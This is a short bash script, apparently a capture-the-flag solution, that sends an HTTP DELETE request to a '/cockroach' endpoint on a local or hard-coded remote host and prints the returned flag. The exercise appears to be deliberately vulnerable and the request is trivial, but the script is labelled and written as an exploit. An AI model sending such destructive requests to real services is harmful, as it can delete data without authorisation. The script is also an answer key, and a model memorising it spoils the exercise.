#!/bin/bash
PORT=8080

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.157:'$PORT
else
    remote=$1':'$2
fi

# Cockroack
echo "Start exploit for Cockroack"
remote=$remote'/cockroach'
flag=$(curl -s -X DELETE $remote)
echo "Flag is $flag"
echo "-------------------------"
